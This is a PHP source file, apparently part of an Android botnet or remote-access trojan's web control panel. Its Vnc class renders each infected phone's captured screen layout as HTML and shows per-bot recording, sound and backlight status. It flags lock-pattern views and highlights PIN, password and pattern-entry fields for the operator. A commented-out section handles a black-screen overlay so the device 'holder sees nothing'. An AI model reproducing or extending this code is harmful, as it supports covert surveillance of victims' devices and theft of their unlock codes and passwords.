<?php
require_once "../helpers.php";

//~ define("SCALE", 0.5);

class Vnc
{
	public $displayWidth;
	public $displayHeight;
	public $isLayoutVertical;
	public $has_lockPatternView = false;
	
	public static function formatStatus($bot_id, $data, $btn_size='btn-sm')
	{
		if($data == "") return "";
		//~ var_dump($data);
		 // layout:on|off; screen:on|off; sound:on|off|forbid; backlight:on|off|forbid
		
		if(strstr($data, "screen:on;"))
			$text_only = "";
		else
			$text_only = "&text_only=1";
		
		$st = "<a href='?a=admin&action=vnc&bot_id={$bot_id}{$text_only}&scale=0.5'><button style='margin-top: 5px' class='btn btn-default {$btn_size}' ><span>VNC</span>";
		
		if(strstr($data, "screen:on;"))
			$st .= "<span title='Screen record on'><i class='flaticon-facetime-button' style='color: blue'></i></span>";
		else
			$st .= "<span title='Screen record off'><i class='flaticon-facetime-button' style='color: grey'></i></span>";
		
		if(strstr($data, "sound:off;"))
			$st .= "<span title='Sound disabled'><i class='flaticon-volume-up-interface-symbol' style='color: grey'></i></span>";
		else if(strstr($data, "sound:forbid;"))
			$st .= "<span title='Sound enabled, no permission'><i class='flaticon-volume-up-interface-symbol' style='color: darkred'></i></span>";
		else
			$st .= "<span title='Sound enabled'><i class='flaticon-volume-up-interface-symbol' style='color: red'></i></span>";
		
		if(strstr($data, "backlight:off;"))
			$st .= "<span title='Backlight off'><i class='flaticon-certificate-shape' style='color: grey'></i></span>";
		else if(strstr($data, "backlight:forbid;"))
			$st .= "<span title='Backlight on, no permission'><i class='flaticon-certificate-shape' style='color: darkred'></i></span>";
		else
			$st .= "<span title='Backlight on'><i class='flaticon-certificate-shape' style='color: red'></i></span>";
		
		/*
		if(strstr($data, "overlay:off;"))
			$st .= "<span title='Black screen off'><i class='flaticon-rounded-black-square-shape' style='color: grey'></i></span>";
		else if(strstr($data, "overlay:forbid;"))
			$st .= "<span title='Black screen off, no permission'><i class='flaticon-rounded-black-square-shape' style='color: darkred'></i></span>";
		else if(strstr($data, "overlay:on;"))
			$st .= "<span title='Black screen on, holder sees nothing'><i class='flaticon-rounded-black-square-shape' style='color: black'></i></span>";
		*/
		
		$st .= "</button></a>";
		
		return $st;
	}
	
	public function draw($file, $bot_id, $scale, $relative_left, $relative_top)
	{
		$lay = file_get_contents($file);
		
		preg_match("/<rootData[\S\s]+? >/", $lay, $match);
		$rootData = $match[0]; 
		
		$pc = explode(";", $rootData);
		
		preg_match("/display_size:([0-9]+)x([0-9]+)/", $pc[0], $match);
		
		$displayWidth = $match[1];
		$displayHeight = $match[2];
		
		$displayWidth *= $scale;
		$displayHeight *= $scale;

		$this->has_lockPatternView = (bool)(strstr($lay, ":id/lockPatternView;"));
		
		if(strstr($lay, "display_orientation:portrait;"))
			$this->isLayoutVertical = true;
		else
			$this->isLayoutVertical = false;

		//~ if(!$this->isLayoutVertical)
		//~ {
			//~ $tmp = $displayHeight;
			//~ $displayHeight = $displayWidth;
			//~ $displayWidth = $tmp;
		//~ }
		
		
		$this->displayWidth = $displayWidth;
		$this->displayHeight = $displayHeight;

		#### INITIAL TOP OFFSET

		//~ preg_match_all("/node_rect:([0-9\ ]+);/", $lay, $match);
		//~ if(sizeof($match[0]))
		//~ {
			//~ $first_top = 0;
			//~ foreach($match[1] as $rect)
			//~ {
				//~ list($left, $top, $right, $bottom) = explode(" ", $rect); // 0 0 720 1520 "left top right bottom"
				//~ if($left == 0) continue;
				
				//~ $first_top = $top;
				//~ break;
			//~ }

			//~ $relative_top -= $first_top*$scale; // top offset decreased
		//~ }
		
		#### ELEMENTS
		
		preg_match_all("/<element[\S\s]+? >/", $lay, $match);
		$elems = $match[0];
		
		$html = "";
		//~ $tree = array();
		$cur_depth = 0;
		$unclosed = 0;

		for($i=0; $i<sizeof($elems); $i++)
		{
			list($depth, $div) = $this->element2div($elems[$i], $relative_left, $relative_top, $scale);
			
			if($div == "") continue;  // outside of screen
			
			$cur_depth = $depth;
			$unclosed++;
			
			for($j=0; $j<$cur_depth; $j++)
				$div = " " . $div;
				
			if(isset($elems[$i+1]))
			{
				$next_elem = $elems[$i+1];
				
				$next_depth = 0;
				preg_match("/depth:([0-9]+)/", $next_elem, $match);
				//~ var_dump($match);
				if(sizeof($match))
				{
					$next_depth = (int)$match[1];
				}
				
				if($next_depth == $cur_depth || $next_depth < $cur_depth)
				{
					$div .= "</div>\n\n";
					$unclosed--;
				}else{
					$div .= "\n";
				}
			}else{
				$div .= "</div>\n\n";
				$unclosed--;
			}
			
			$html .= $div;
		}
		
		while($unclosed--)
			$html .= "</div>\n";

		return $html;
	}
	
	// returns div unclosed:  <div params>
	function element2div($m, $relative_left, $relative_top, $scale)
	{
		$pc = explode("<element ", $m);
		$pc = explode(";", $pc[1]);
		
		$data = [];
		foreach($pc as $p)
		{
			$p = trim($p);
			if($p == ">") continue;
			if(!strstr($p, ":"))
			{
				//~ var_dump("BAD_PIECE:$p\n");
				continue;
			}
			
			list($key, $val) = explode(":", $p, 2);
			$data[$key] = $val;
		}
		
		###
		
		list($left, $top, $right, $bottom) = explode(" ", $data['node_rect']); // 0 0 720 1520 "left top right bottom"
		
		$left = ((int)$left)*$scale;
		$top = ((int)$top)*$scale;
		$right = ((int)$right)*$scale;
		$bottom = ((int)$bottom)*$scale;
		
		// element outside of screen
		if($left > $this->displayWidth || $top > $this->displayHeight || $right < 0 || $bottom < 0) 
		{
			return array(0, "", 0, 0);
		}
		
		//  remove icons from other screens
		//~ if($left == 0) 
		//~ {
			//~ return array(0, "", 0, 0);
		//~ }
		
		$left = $left + $relative_left;
		$right = $right + $relative_left;
		$top = $top + $relative_top;
		$bottom = $bottom + $relative_top;
		
		//~ var_dump($data); 
		//~ break;
		$w = $right-$left;
		$h = $bottom-$top;

		if($h < 0 || $w < 0)
		{
			return array(0, "", 0, 0);
		}
		
		$color = "blue";
		$bgcolor = "";
		
		
		if(isset($data['text_start']))
			$data['text_start'] = str_replace(":text_end", "", $data['text_start']);
		else
			$data['text_start'] = "";
		
		if(isset($data['errorText_start']))
			$data['errorText_start'] = str_replace(":error_end", "", $data['errorText_start']);
		else
			$data['errorText_start'] = "";
			
		if(isset($data['descr_start']))
			$data['descr_start'] = str_replace(":descr_end", "", $data['descr_start']);
		else
			$data['descr_start'] = "";
		
		if(!isset($data['tooltip']))
			$data['tooltip'] = "";
			
		//~ if(isset($data['text_start']))
		//~ {
			//~ if(strstr($data['text_start'], "Downloaded files"))
			//~ {
				//~ $color = "green";
				//~ $bgcolor = "green";
			//~ }
			
			//~ if(strstr($data['text_start'], "User-defined"))
			//~ {
				//~ $color = "red";
			//~ }

		//~ }else{
			
		//~ }

		$attrs = "";
		foreach($data as $key=>$val)
		{
			$val = str_replace("'", "\'", $val);
			$attrs .= " data-{$key}='{$val}' ";
		}

		$html = "<div id='div_{$data['UID']}'";

		$class = "";
		if(isset($data['isClickable']) && $data['isClickable'] == "true")
		{
			//$html .= " onclick='clickElem(\"div_{$id}\")' ";  -- click in vnc.js getLayout()
			$class = " clickable ";
		}

		$tooltip = "ID: {$data['UID']}
Class: \"{$data['className']}\"
Text: \"{$data['text_start']}\"
ErrorText: \"{$data['errorText_start']}\"
Description: \"{$data['descr_start']}\"
Tooltip: \"{$data['tooltip']}\"
";

		$highlightPassword = "";
		if(isset($data['viewId']))
		if(strstr($data['viewId'], "pinEntry") || strstr($data['viewId'], "passwordEntry") || strstr($data['text_start'], "Draw your pattern"))
		{
			$highlightPassword = "background-color: white; color: black; font-size: 110%";
		}
		
// $scale, $relative_left, $relative_top

		$text = $data['text_start'];

		if($text == "" && $data['descr_start'] != "")
			$text = $data['descr_start'];

		if($text == "" && $data['errorText_start'] != "")
			$text = $data['errorText_start'];

		if($text == "" && $data['tooltip'] != "")
			$text = $data['tooltip'];

		$text = htmlspecialchars($text);

		$customBorder = "";
		if(isset($data['isClickable']))
		{
			$customBorder = "border: 1px solid red";
			$tooltip .= "Element is clickable\n";
		}else if(isset($data['isLongClickable'])){
			$customBorder = "border: 1px solid red";
			$tooltip .= "Element is long clickable\n";
		}else if(isset($data['isPassword'])){
			$customBorder = "border: 1px solid red";
			$tooltip .= "Element is password field\n";
		}else if(isset($data['isScrollable'])){
			$customBorder = "border: 1px solid purple";
			$tooltip .= "Element is scrollable\n";
		}else if(isset($data['isEditable'])){
			$customBorder = "border: 1px solid yellow";
			$tooltip .= "Element is editable\n";
		}

		if(trim($text) != "")
		{
			$mouseover = " onmouseover=\"$(this).css('backgroundColor', 'white')\" ";
		}else{
			$mouseover = "";
		}
		
		$html .= " {$mouseover} class='element {$class}' title='{$tooltip}' style='z-index: {$data['depth']}; position: fixed; background-color: {$bgcolor}; left: {$left}px; top: {$top}px; width: {$w}px; height: {$h}px; {$highlightPassword} {$customBorder}
		' {$attrs}>{$text}";

		return array($data['depth'], $html);
	}
	
}


//~ $vnc = new Vnc();

//~ $bot_id = "492b2d09e0cdbe7956b98de33f8e0c53";
//~ echo $vnc->draw("../data/vnc_{$bot_id}.xml", $bot_id, "1.0", 0, 0);
